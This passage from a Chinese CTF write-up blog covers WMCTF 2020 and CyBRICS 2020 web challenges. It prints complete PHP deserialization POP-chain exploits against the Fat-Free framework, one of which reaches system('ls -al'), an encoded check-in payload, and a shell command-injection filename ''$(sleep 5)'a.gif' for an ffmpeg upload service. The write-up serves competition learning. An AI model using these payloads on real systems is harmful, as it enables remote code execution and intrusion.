p;lV=&amp;lW=&amp;lX=&amp;lY=&amp;lZ=&amp;l0=&amp;l1=&amp;l2=&amp;l3=&amp;l4=&amp;l5=&amp;l6=&amp;l7=&amp;l8=&amp;l9=&amp;ma=&amp;mb=&amp;mc=&amp;md=&amp;me=&amp;mf=&amp;mg=&amp;mh=&amp;mi=&amp;mj=&amp;mk=&amp;ml=&amp;mm=&amp;mn=&amp;mo=&amp;mp=&amp;mq=&amp;mr=&amp;ms=&amp;mt=&amp;mu=&amp;mv=&amp;mw=&amp;mx=&amp;my=&amp;mz=&amp;mA=&amp;mB=&amp;mC=&amp;mD=&amp;mE=&amp;mF=&amp;mG=&amp;mH=&amp;mI=&amp;mJ=&amp;mK=&amp;mL=&amp;mM=&amp;mN=&amp;mO=&amp;mP=&amp;mQ=&amp;mR=&amp;mS=&amp;mT=&amp;mU=&amp;mV=&amp;mW=&amp;mX=&amp;mY=&amp;mZ=&amp;m0=&amp;m1=&amp;m2=&amp;m3=&amp;m4=&amp;m5=&amp;m6=&amp;m7=&amp;m8=&amp;m9=&amp;na=&amp;nb=&amp;nc=&amp;nd=&amp;ne=&amp;nf=&amp;ng=&amp;nh=&amp;ni=&amp;nj=&amp;nk=&amp;nl=&amp;nm=&amp;nn=&amp;no=&amp;np=&amp;nq=&amp;nr=&amp;ns=&amp;nt=&amp;nu=&amp;nv=&amp;nw=&amp;nx=&amp;ny=&amp;nz=&amp;nA=&amp;nB=&amp;nC=&amp;nD=&amp;nE=&amp;nF=&amp;nG=&amp;nH=&amp;nI=&amp;nJ=&amp;nK=&amp;nL=&amp;nM=&amp;nN=&amp;nO=&amp;nP=&amp;nQ=&amp;nR=&amp;nS=&amp;nT=&amp;nU=&amp;nV=&amp;nW=&amp;nX=&amp;nY=&amp;nZ=&amp;n0=&amp;n1=&amp;n2=&amp;n3=&amp;n4=&amp;n5=&amp;n6=&amp;n7=&amp;n8=&amp;n9=&amp;oa=&amp;ob=&amp;oc=&amp;od=&amp;oe=&amp;of=&amp;og=&amp;oh=&amp;oi=&amp;oj=&amp;ok=&amp;ol=&amp;om=&amp;on=&amp;oo=&amp;op=&amp;oq=&amp;or=&amp;os=&amp;ot=&amp;ou=&amp;ov=&amp;ow=&amp;ox=&amp;oy=&amp;oz=&amp;oA=&amp;oB=&amp;oC=&amp;oD=&amp;oE=&amp;oF=&amp;oG=&amp;oH=&amp;oI=&amp;oJ=&amp;oK=&amp;oL=&amp;oM=&amp;oN=&amp;oO=&amp;oP=&amp;oQ=&amp;oR=&amp;oS=&amp;oT=&amp;oU=&amp;oV=&amp;oW=&amp;oX=&amp;oY=&amp;oZ=&amp;o0=&amp;o1=&amp;o2=&amp;o3=&amp;o4=&amp;o5=&amp;o6=&amp;o7=&amp;o8=&amp;o9=&amp;pa=&amp;pb=&amp;pc=&amp;pd=&amp;pe=&amp;pf=&amp;pg=&amp;ph=&amp;pi=&amp;pj=&amp;pk=&amp;pl=&amp;pm=&amp;pn=&amp;po=&amp;pp=&amp;pq=&amp;pr=&amp;ps=&amp;pt=&amp;pu=&amp;pv=&amp;pw=&amp;px=&amp;py=&amp;pz=&amp;pA=&amp;pB=&amp;pC=&amp;pD=&amp;pE=&amp;pF=&amp;pG=&amp;pH=&amp;pI=&amp;pJ=&amp;pK=&amp;pL=&amp;pM=&amp;pN=&amp;pO=&amp;pP=&amp;pQ=&amp;pR=&amp;pS=&amp;pT=&amp;pU=&amp;pV=&amp;pW=&amp;pX=&amp;pY=&amp;pZ=&amp;p0=&amp;p1=&amp;p2=&amp;p3=&amp;p4=&amp;p5=&amp;p6=&amp;p7=&amp;p8=&amp;p9=&amp;qa=&amp;qb=&amp;qc=&amp;qd=&amp;qe=&amp;qf=&amp;qg=&amp;qh=&amp;qi=&amp;qj=&amp;qk=&amp;ql=&amp;qm=&amp;qn=&amp;qo=&amp;qp=&amp;qq=&amp;qr=&amp;qs=&amp;qt=&amp;qu=&amp;qv=&amp;qw=&amp;qx=&amp;qy=&amp;qz=&amp;qA=&amp;qB=&amp;qC=&amp;qD=&amp;qE=&amp;qF=&amp;qG=&amp;qH=&amp;qI=&amp;qJ=&amp;qK=&amp;qL=&amp;qM=&amp;qN=&amp;qO=&amp;qP=&amp;qQ=&amp;qR=&amp;qS=&amp;qT=&amp;qU=&amp;qV=&amp;qW=&amp;qX=&amp;qY=&amp;qZ=&amp;q0=&amp;q1=&amp;q2=&amp;q3=&amp;q4=&amp;q5=&amp;q6=&amp;q7=&amp;q8=&amp;q9=&amp;ra=&amp;rb=&amp;rc=&amp;rd=&amp;re=&amp;rf=&amp;rg=&amp;rh=&amp;ri=&amp;rj=&amp;rk=&amp;rl=&amp;rm=&amp;rn=&amp;ro=&amp;rp=&amp;rq=&amp;rr=&amp;rs=&amp;rt=&amp;ru=&amp;rv=&amp;rw=&amp;rx=&amp;ry=&amp;rz=&amp;rA=&amp;rB=&amp;rC=&amp;rD=&amp;rE=&amp;rF=&amp;rG=&amp;rH=&amp;rI=&amp;rJ=&amp;rK=&amp;rL=&amp;rM=&amp;rN=&amp;rO=&amp;rP=&amp;rQ=&amp;rR=&amp;rS=&amp;rT=&amp;rU=&amp;rV=&amp;rW=&amp;rX=&amp;rY=&amp;rZ=&amp;r0=&amp;r1=&amp;r2=&amp;r3=&amp;r4=&amp;r5=&amp;r6=&amp;r7=&amp;r8=&amp;r9=&amp;sa=&amp;sb=&amp;sc=&amp;sd=&amp;se=&amp;sf=&amp;sg=&amp;sh=&amp;si=&amp;sj=&amp;sk=&amp;sl=&amp;sm=&amp;sn=&amp;so=&amp;sp=&amp;sq=&amp;sr=&amp;ss=&amp;st=&amp;su=&amp;sv=&amp;sw=&amp;sx=&amp;sy=&amp;sz=&amp;sA=&amp;sB=&amp;sC=&amp;sD=&amp;sE=&amp;sF=&amp;sG=&amp;sH=&amp;sI=&amp;sJ=&amp;sK=&amp;sL=&amp;sM=&amp;sN=&amp;sO=&amp;sP=&amp;sQ=&amp;sR=&amp;sS=&amp;sT=&amp;sU=&amp;sV=&amp;sW=&amp;sX=&amp;sY=&amp;sZ=&amp;s0=&amp;s1=&amp;s2=&amp;s3=&amp;s4=&amp;s5=&amp;s6=&amp;s7=&amp;s8=&amp;s9=&amp;ta=&amp;tb=&amp;tc=&amp;td=&amp;te=&amp;tf=&amp;tg=&amp;th=&amp;ti=&amp;tj=&amp;tk=&amp;tl=&amp;tm=&amp;tn=&amp;to=&amp;tp=&amp;tq=&amp;tr=&amp;ts=&amp;tt=&amp;tu=&amp;tv=&amp;tw=&amp;tx=&amp;ty=&amp;tz=&amp;tA=&amp;tB=&amp;tC=&amp;tD=&amp;tE=&amp;tF=&amp;tG=&amp;tH=&amp;tI=&amp;tJ=&amp;tK=&amp;tL=&amp;tM=&amp;tN=&amp;tO=&amp;tP=&amp;tQ=&amp;tR=&amp;tS=&amp;tT=&amp;tU=&amp;tV=&amp;tW=&amp;tX=&amp;tY=&amp;tZ=&amp;t0=&amp;t1=&amp;t2=&amp;t3=&amp;t4=&amp;t5=&amp;t6=&amp;t7=&amp;t8=&amp;t9=&amp;ua=&amp;ub=&amp;uc=&amp;ud=&amp;ue=&amp;uf=&amp;ug=&amp;uh=&amp;ui=&amp;uj=&amp;uk=&amp;ul=&amp;um=&amp;un=&amp;uo=&amp;up=&amp;uq=&amp;ur=&amp;us=&amp;ut=&amp;uu=&amp;uv=&amp;uw=&amp;ux=&amp;uy=&amp;uz=&amp;uA=&amp;uB=&amp;uC=&amp;uD=&amp;uE=&amp;uF=&amp;uG=&amp;uH=&amp;uI=&amp;uJ=&amp;uK=&amp;uL=&amp;uM=&amp;uN=&amp;uO=&amp;uP=&amp;uQ=&amp;uR=&amp;uS=&amp;uT=&amp;uU=&amp;uV=&amp;uW=&amp;uX=&amp;uY=&amp;uZ=&amp;u0=&amp;u1=&amp;u2=&amp;u3=&amp;u4=&amp;u5=&amp;u6=&amp;u7=&amp;u8=&amp;u9=&amp;va=&amp;vb=&amp;vc=&amp;vd=&amp;ve=&amp;vf=&amp;vg=&amp;vh=&amp;vi=&amp;vj=&amp;vk=&amp;vl=&amp;vm=&amp;vn=&amp;vo=&amp;vp=&amp;vq=&amp;vr=&amp;vs=&amp;vt=&amp;vu=&amp;vv=&amp;vw=&amp;vx=&amp;vy=&amp;vz=&amp;vA=&amp;vB=&amp;vC=&amp;vD=&amp;vE=&amp;vF=&amp;vG=&amp;vH=&amp;vI=&amp;vJ=&amp;vK=&amp;vL=&amp;vM=&amp;vN=&amp;vO=&amp;vP=&amp;vQ=&amp;vR=&amp;vS=&amp;vT=&amp;vU=&amp;vV=&amp;vW=&amp;vX=&amp;vY=&amp;vZ=&amp;v0=&amp;v1=&amp;v2=&amp;v3=&amp;v4=&amp;v5=&amp;v6=&amp;v7=&amp;v8=&amp;v9=&amp;wa=&amp;wb=&amp;wc=&amp;wd=&amp;we=&amp;wf=&amp;wg=&amp;wh=&amp;wi=&amp;wj=&amp;wk=&amp;wl=&amp;wm=&amp;wn=&amp;wo=&amp;wp=&amp;wq=&amp;wr=&amp;ws=&amp;wt=&amp;wu=&amp;wv=&amp;ww=&amp;wx=&amp;wy=&amp;wz=&amp;wA=&amp;wB=&amp;wC=&amp;wD=&amp;wE=&amp;wF=&amp;wG=&amp;wH=&amp;wI=&amp;wJ=&amp;wK=&amp;wL=&amp;wM=&amp;wN=&amp;wO=&amp;wP=&amp;wQ=&amp;wR=&amp;wS=&amp;wT=&amp;wU=&amp;wV=&amp;wW=&amp;wX=&amp;wY=&amp;wZ=&amp;w0=&amp;w1=&amp;w2=&amp;w3=&amp;w4=&amp;w5=&amp;w6=&amp;w7=&amp;w8=&amp;w9=&amp;xa=&amp;xb=&amp;xc=&amp;xd=&amp;xe=&amp;xf=&amp;xg=&amp;xh=&amp;xi=&amp;xj=&amp;xk=&amp;xl=&amp;xm=&amp;xn=&amp;xo=&amp;xp=&amp;xq=&amp;xr=&amp;xs=&amp;xt=&amp;xu=&amp;xv=&amp;xw=&amp;xx=&amp;xy=&amp;xz=&amp;xA=&amp;xB=&amp;xC=&amp;xD=&amp;xE=&amp;xF=&amp;xG=&amp;xH=&amp;xI=&amp;xJ=&amp;xK=&amp;xL=&amp;xM=&amp;xN=&amp;xO=&amp;xP=&amp;xQ=&amp;xR=&amp;xS=&amp;xT=&amp;xU=&amp;xV=&amp;xW=&amp;xX=&amp;xY=&amp;xZ=&amp;x0=&amp;x1=&amp;x2=&amp;x3=&amp;x4=&amp;x5=&amp;x6=&amp;x7=&amp;x8=&amp;x9=&amp;ya=&amp;yb=&amp;yc=&amp;yd=&amp;ye=&amp;yf=&amp;yg=&amp;yh=&amp;yi=&amp;yj=&amp;yk=&amp;yl=&amp;ym=&amp;yn=&amp;yo=&amp;yp=&amp;yq=&amp;yr=&amp;ys=&amp;yt=&amp;yu=&amp;yv=&amp;yw=&amp;yx=&amp;yy=&amp;yz=&amp;yA=&amp;yB=&amp;yC=&amp;yD=&amp;yE=&amp;yF=&amp;yG=&amp;yH=&amp;yI=&amp;yJ=&amp;yK=&amp;yL=&amp;yM=&amp;yN=&amp;yO=&amp;yP=&amp;yQ=&amp;yR=&amp;yS=&amp;yT=&amp;yU=&amp;yV=&amp;yW=&amp;yX=&amp;yY=&amp;yZ=&amp;y0=&amp;y1=&amp;y2=&amp;y3=&amp;y4=&amp;y5=&amp;y6=&amp;y7=&amp;y8=&amp;y9=&amp;za=&amp;zb=&amp;zc=&amp;zd=&amp;ze=&amp;zf=&amp;zg=&amp;zh=&amp;zi=&amp;zj=&amp;zk=&amp;zl=&amp;zm=&amp;zn=&amp;zo=&amp;zp=&amp;zq=&amp;zr=&amp;zs=&amp;zt=&amp;zu=&amp;zv=&amp;zw=&amp;zx=&amp;zy=&amp;zz=&amp;zA=&amp;zB=&amp;zC=&amp;zD=&amp;zE=&amp;zF=&amp;zG=&amp;zH=&amp;zI=&amp;zJ=&amp;zK=&amp;zL=&amp;zM=&amp;zN=&amp;zO=&amp;zP=&amp;zQ=&amp;zR=&amp;zS=&amp;zT=&amp;zU=&amp;zV=&amp;zW=&amp;zX=&amp;zY=&amp;zZ=&amp;z0=&amp;z1=&amp;z2=&amp;z3=&amp;z4=&amp;z5=&amp;z6=&amp;z7=&amp;z8=&amp;z9=&amp;Aa=&amp;Ab=&amp;Ac=&amp;Ad=&amp;Ae=&amp;Af=&amp;Ag=&amp;Ah=&amp;Ai=&amp;Aj=&amp;Ak=&amp;Al=&amp;Am=&amp;An=&amp;Ao=&amp;Ap=&amp;Aq=&amp;Ar=&amp;As=&amp;At=&amp;Au=&amp;Av=&amp;Aw=&amp;Ax=&amp;Ay=&amp;Az=&amp;AA=&amp;AB=&amp;AC=&amp;AD=&amp;AE=&amp;AF=&amp;AG=&amp;AH=&amp;AI=&amp;AJ=&amp;AK=&amp;AL=&amp;AM=&amp;AN=&amp;AO=&amp;AP=&amp;AQ=&amp;AR=&amp;AS=&amp;AT=&amp;AU=&amp;AV=&amp;AW=&amp;AX=&amp;AY=&amp;AZ=&amp;A0=&amp;A1=&amp;A2=&amp;A3=&amp;A4=&amp;A5=&amp;A6=&amp;A7=&amp;A8=&amp;A9=&amp;Ba=&amp;Bb=&amp;Bc=&amp;Bd=&amp;Be=&amp;Bf=&amp;Bg=&amp;Bh=&amp;Bi=&amp;Bj=&amp;Bk=&amp;Bl=&amp;Bm=&amp;Bn=&amp;Bo=&amp;Bp=&amp;Bq=&amp;Br=&amp;Bs=&amp;Bt=&amp;Bu=&amp;Bv=&amp;Bw=&amp;Bx=&amp;By=&amp;Bz=&amp;BA=&amp;BB=&amp;BC=&amp;BD=&amp;BE=&amp;BF=&amp;BG=&amp;BH=&amp;BI=&amp;BJ=&amp;BK=&amp;BL=&amp;BM=&amp;BN=&amp;BO=&amp;BP=&amp;BQ=&amp;BR=&amp;BS=&amp;BT=&amp;BU=&amp;BV=&amp;BW=&amp;BX=&amp;BY=&amp;BZ=&amp;B0=&amp;B1=&amp;B2=&amp;B3=&amp;B4=&amp;B5=&amp;B6=&amp;B7=&amp;B8=&amp;B9=&amp;Ca=&amp;Cb=&amp;Cc=&amp;Cd=&amp;Ce=&amp;Cf=&amp;Cg=&amp;Ch=&amp;Ci=&amp;Cj=&amp;Ck=&amp;Cl=&amp;Cm=&amp;Cn=&amp;Co=&amp;Cp=&amp;Cq=&amp;Cr=&amp;Cs=&amp;Ct=&amp;Cu=&amp;Cv=&amp;Cw=&amp;Cx=&amp;Cy=&amp;Cz=&amp;CA=&amp;CB=&amp;CC=&amp;CD=&amp;CE=&amp;CF=&amp;CG=&amp;CH=&amp;CI=&amp;CJ=&amp;CK=&amp;CL=&amp;CM=&amp;CN=&amp;CO=&amp;CP=&amp;CQ=&amp;CR=&amp;CS=&amp;CT=&amp;CU=&amp;CV=&amp;CW=&amp;CX=&amp;CY=&amp;CZ=&amp;C0=&amp;C1=&amp;C2=&amp;C3=&amp;C4=&amp;C5=&amp;C6=&amp;C7=&amp;C8=&amp;C9=&amp;Da=&amp;Db=&amp;Dc=&amp;Dd=&amp;De=&amp;Df=&amp;Dg=&amp;Dh=&amp;Di=&amp;Dj=&amp;Dk=&amp;Dl=&amp;Dm=&amp;Dn=&amp;Do=&amp;Dp=&amp;Dq=&amp;Dr=&amp;Ds=&amp;Dt=&amp;Du=&amp;Dv=&amp;Dw=&amp;Dx=&amp;Dy=&amp;Dz=&amp;DA=&amp;DB=&amp;DC=&amp;DD=&amp;DE=&amp;DF=&amp;DG=&amp;DH=&amp;DI=&amp;DJ=&amp;DK=&amp;DL=&amp;DM=&amp;DN=&amp;DO=&amp;DP=&amp;DQ=&amp;DR=&amp;DS=&amp;DT=&amp;DU=&amp;DV=&amp;DW=&amp;DX=&amp;DY=&amp;DZ=&amp;D0=&amp;D1=&amp;D2=&amp;D3=&amp;D4=&amp;D5=&amp;D6=&amp;D7=&amp;D8=&amp;D9=&amp;Ea=&amp;Eb=&amp;Ec=&amp;Ed=&amp;Ee=&amp;Ef=&amp;Eg=&amp;Eh=&amp;Ei=&amp;Ej=&amp;Ek=&amp;El=&amp;Em=&amp;En=&amp;Eo=&amp;Ep=&amp;Eq=&amp;Er=&amp;Es=&amp;Et=&amp;Eu=&amp;Ev=&amp;Ew=&amp;Ex=&amp;Ey=&amp;Ez=&amp;EA=&amp;EB=&amp;EC=&amp;ED=&amp;EE=&amp;EF=&amp;EG=&amp;EH=&amp;EI=&amp;EJ=&amp;EK=&amp;EL=&amp;EM=&amp;EN= HTTP/1.1
Host: web_checkin2.wmctf.wetolink.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

</code></pre><p>测试发现，就如我们猜想的一样。</p>
<p>访问<code>http://web_checkin2.wmctf.wetolink.com/?content=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An</code><br>拿到flag:<code>WMCTF{3C5E9715-5BEE-4D33-8627-DE10E5D92715}</code></p>
<h2 id="webweb"><a href="#webweb" class="headerlink" title="webweb"></a>webweb</h2><p>这题本地测试成功远程不行，不知道为啥，静等其他人的wp</p>
<p>代码很简单：</p>
<pre><code class="php">&lt;?php

// Kickstart the framework
$f3=require(&#39;lib/base.php&#39;);

$f3-&gt;set(&#39;DEBUG&#39;,1);
if ((float)PCRE_VERSION&lt;8.0)
    trigger_error(&#39;PCRE version is out of date&#39;);

// Load configuration
$f3-&gt;config(&#39;config.ini&#39;);

$f3-&gt;route(&#39;GET /&#39;,
    function($f3) {
        echo &quot;just get me a,don&#39;t do anything else&quot;;
    }
);
unserialize($_GET[&#39;a&#39;]);

$f3-&gt;run();
</code></pre>
<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>又是一题反序列化</p>
<p>老规矩开局找入口点：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804104714.png" alt="image11496"></p>
<p>这里只有这一个入口点，这个入口点还挺不错的。</p>
<p>接下来我们可以考虑调用魔术方法或者是利用<code>$func($this)</code>来构造下一步</p>
<p>这里可以利用的魔术方法有：<code>__get</code>和<code>__call</code>，找了一波没啥好用的魔术方法，那么我们就利用<code>$func($this)</code>吧</p>
<p>接下来我们有两种思路：</p>
<ol>
<li>扩宽道路，就是找一个函数，里面调用有意思的方法的</li>
<li>确定pop链尾</li>
</ol>
<p>我这里是先扩宽反序列化的道路再去找链尾的，毕竟可以当链尾的太多了</p>
<p>慢慢找过去发现一个有意思的方法</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804105340.png" alt="image11818"></p>
<p>这里可以调用:<code>$func($url,false,true)</code>，如果我们能控制<code>$url</code>那么我们就能舒服多了，那么我们接下来就是要找个可以控制<code>$url</code>的地方</p>
<p>找着找着发现了<code>Base::run</code>这个方法</p>
<pre><code class="php">function run();</code></pre>
<p>可以直接利用<code>$func($this);</code>来调用它（对于用户自定义的函数/方法，多一些参数没啥影响，但是对大部分自带的函数就不行了，原因估计是自带的函数都是c编写的固定参数的函数），我们来看下它调用<code>reroute</code>的地方</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804110131.png" alt="image12152"></p>
<p>我们可以看到确实<code>$url</code>是我们可以控制的，现在就是要让语句执行到这里，这个没啥好说的，有耐心一点慢慢调就ok了，直接换上payload了：</p>
<p>接下来就是需要找到一个合适的函数，本地fuzz自带的函数发现，exec是可以的，虽然它会报错</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804110718.png" alt="image12361"></p>
<p>amazing，划重点这是要考的，虽然本地可以，但是</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804110842.png" alt="image12473"></p>
<p>服务器上去测试就segment fault了，黯然离去.jpg</p>
<p>接下来我们只能去找框架的函数了</p>
<p>找着找着我找到了：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804111008.png" alt="image12618"></p>
<p>这样一个东西，这个函数就很nice</p>
<p>我们传入<code>WEB-&gt;send(&#39;/flag&#39;,false,true);</code>那么我们就能得到<code>/flag</code>的内容了</p>
<p>最后payload如下：</p>
<pre><code class="php">&lt;?php

namespace CLI{
    class Agent {
        protected
            $server=&quot;&quot;,
            $id=&quot;&quot;,
            $socket=&quot;&quot;,
            $flag=&quot;&quot;,
            $verb=&quot;&quot;,
            $uri=&quot;&quot;,
            $headers=&quot;&quot;;
        public $events;
        public function check(){

        }
        public function __construct(){
            $this-&gt;events=[&quot;disconnect&quot;=&gt;array(new \base(),&quot;run&quot;)];
            $this-&gt;server=&amp;$this;


        }
    };
    class WS
    {
        protected
            $addr=&quot;&quot;,
            $ctx=&quot;&quot;,
            $wait=&quot;&quot;,
            $sockets=&quot;&quot;,
            $protocol=&quot;&quot;,
            $agents = [];
        public $events = [&quot;disconnect&quot;=&gt;&quot;bbbbb&quot;];
        public function __construct($val)
        {
            $this-&gt;addr = $val;
        }
    }

}
namespace DB{

    abstract class Cursor  implements \IteratorAggregate {
        protected
            //! Flat-file DB wrapper
            $db,
            //! Data file
            $file,
            //! Document identifier
            $id,
            //! Document contents
            $document=[],
            //! field map-reduce handlers
            $_reduce;
    }
}
namespace DB\Jig{

    use Traversable;

    class Mapper extends \DB\Cursor{
        protected
            //! Flat-file DB wrapper
            $db,
            //! Data file
            $file,
            //! Document identifier
            $id,
            //! Document contents
            $document=[],
            //! field map-reduce handlers
            $_reduce;
        public function __construct(){
            $this-&gt;db = new \base();
            $this-&gt;file = &quot;index.php&quot;;
        }

        public function getIterator()
        {
            // TODO: Implement getIterator() method.
        }
        function exists($key)
        {
            // TODO: Implement exists() method.
        }

        function set($key, $val)
        {
            // TODO: Implement set() method.
        }

        function get($key)
        {
            // TODO: Implement get() method.
        }

        function clear($key)
        {
            // TODO: Implement clear() method.
        }

        public function offsetExists($offset)
        {
            // TODO: Implement offsetExists() method.
        }

        public function offsetGet($offset)
        {
            // TODO: Implement offsetGet() method.
        }

        public function offsetSet($offset, $value)
        {
            // TODO: Implement offsetSet() method.
        }
        public function offsetUnset($offset)
        {
            // TODO: Implement offsetUnset() method.
        }
    }
}

namespace {
    abstract class Prefab {
        static function instance() {
            if (!Registry::exists($class=get_called_class())) {
                $ref=new ReflectionClass($class);
                $args=func_get_args();
                Registry::set($class,
                    $args?$ref-&gt;newinstanceargs($args):new $class);
            }
            return Registry::get($class);
        }

    }
    final class Base extends Prefab implements ArrayAccess{
        private
            $hive,
            $init,
            $languages,
            $locks=[],
            $fallback=&#39;en&#39;;
        public function __construct(){
            $this-&gt;hive=[
                &quot;ROUTES&quot;=&gt;[&#39;/flag/&#39;=&gt;[[&#39;GET&#39;=&gt;1]],&quot;2&quot;=&gt;1],
                &quot;PATH&quot;=&gt;&#39;/flag/&#39;,#$url
                &quot;QUERY&quot;=&gt;&quot;&quot;,
                &quot;VERB&quot;=&gt;&quot;GET&quot;,
                &quot;PARAMS&quot;=&gt;[],
                &quot;ONREROUTE&quot;=&gt;&quot;WEB-&gt;send&quot;,#$func
                &quot;CLI&quot;=&gt;&#39;123&#39;
                ];
        }

        public function offsetExists($offset)
        {
        }
        public function offsetGet($offset)
        {
        }

        public function offsetSet($offset, $value)
        {
            // TODO: Implement offsetSet() method.
        }

        public function offsetUnset($offset)
        {
            // TODO: Implement offsetUnset() method.
        }
    }
    abstract class Magic implements \ArrayAccess{

    }

    echo urlencode(serialize(new \CLI\WS(new \CLI\Agent())));
}</code></pre>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804111403.png" alt="image16897"></p>
<p>然而在题目中它虽然执行了<code>WEB-&gt;send</code>方法（根据错误信息得知），但是并不会返回<code>/flag</code>（所有文件都读不了），希望有看到的师傅给个解答</p>
<h3 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h3><p>果然是我一句魔术方法里面没啥好用的这一句话断送了我的flag，有这样一个魔术方法</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804114525.png" alt="image17108"></p>
<p>它通过控制<code>$this-&gt;props</code>我们可以调用任意函数，那么我们只需要找到一个可控参数的位置就可以了</p>
<p>找到</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804120508.png" alt="image17250"></p>
<p>构造payload</p>
<pre><code class="php">&lt;?php
namespace DB{
    abstract class Cursor  implements \IteratorAggregate {}
}


namespace DB\SQL{
    class Mapper extends \DB\Cursor{
        protected
            $props=[&quot;quotekey&quot;=&gt;&quot;system&quot;],
            $adhoc=[&quot;ls -al&quot;=&gt;[&quot;expr&quot;=&gt;&quot;&quot;]],
            $db;
        function offsetExists($offset){}
        function offsetGet($offset){}
        function offsetSet($offset, $value){}
        function offsetUnset($offset){}
        function getIterator(){}
        function __construct($val){
            $this-&gt;db = $val;
        }
    }
}
namespace CLI{
    class Agent {
        protected
            $server=&quot;&quot;;
        public $events;
        public function __construct(){
            $this-&gt;events=[&quot;disconnect&quot;=&gt;array(new \DB\SQL\Mapper(new \DB\SQL\Mapper(&quot;&quot;)),&quot;find&quot;)];
            $this-&gt;server=&amp;$this;


        }
    };
    class WS{}
}
namespace {
    echo urlencode(serialize(array(new \CLI\WS(),new \CLI\Agent())));
}</code></pre>
<h2 id="Make-PHP-Great-Again-amp-amp-Make-PHP-Great-Again-2-0"><a href="#Make-PHP-Great-Again-amp-amp-Make-PHP-Great-Again-2-0" class="headerlink" title="Make PHP Great Again  &amp;&amp;  Make PHP Great Again 2.0"></a>Make PHP Great Again  &amp;&amp;  Make PHP Great Again 2.0</h2><p>这题是学长闲的无聊解出来的，说10分钟就ok的题目。。。膜拜</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804123108.png" alt="image18383"></p>
<p>实际调试的时候是这样的：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/RF5J9(A_2K%24)Z4VG%251B0WZI.png" alt="image18481"></p>
<p>上面还有一堆tsrm_realpath_r。</p>
<p>还有啥好说的？看代码。。。。</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/08/04/wmctf2020/">http://blog.ccreater.top/2020/08/04/wmctf2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/08/04/wmctf2020/" data-id="ckdfge4h200008sv096ew8oee" data-title="wmctf2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-CyBRICS2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/29/CyBRICS2020/" class="article-date">
  <time class="dt-published" datetime="2020-07-29T04:55:37.052Z" itemprop="datePublished">2020-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/29/CyBRICS2020/">CyBRICS2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CyBRICS-2020"><a href="#CyBRICS-2020" class="headerlink" title="CyBRICS  2020"></a>CyBRICS  2020</h1><h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>用burp修改返回包</p>
<p>flag:<code>cybrics{Th0se_c4p7ch4s_c4n_hunter2_my_hunter2ing_hunter2}</code></p>
<h2 id="Gif2png"><a href="#Gif2png" class="headerlink" title="Gif2png"></a>Gif2png</h2><p>源代码已上传</p>
<pre><code>if not bool(re.match(&quot;^[a-zA-Z0-9_\-. &#39;\&quot;\=\$\(\)\|]*$&quot;, file.filename)):
    exit()
...
def allowed_file(filename):
    return &#39;.&#39; in filename and filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS
allowed_file(file.filename)
...
command = subprocess.Popen(f&quot;ffmpeg -i &#39;uploads/{file.filename}&#39; \&quot;uploads/{uid}/%03d.png\&quot;&quot;, shell=True)</code></pre><p><code>filename=&quot;&#39;$(sleep 5)&#39;a.gif&quot;</code>来执行命令</p>
<p>cybrics{imagesaresocoolicandrawonthem}</p>
<h2 id="woc"><a href="#woc" class="headerlink" title="woc"></a>woc</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200726002857.png" alt="image631"></p>
<p>calc.php</p>
<pre><code class="php=">if (!preg_match(&#39;#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?&gt;[^()]+|(?4))*\)[^()]*)*)$#s&#39;, $field)) {
        $value = &quot;BAD&quot;;
    }else{
    $value = eval(&quot;return $field;&quot;);
}</code></pre>
<pre><code>9999999999999999999:1.0E+25
1/0:INF
0/0:NAN
log(0):-INF</code></pre><p>newtemplate.php</p>
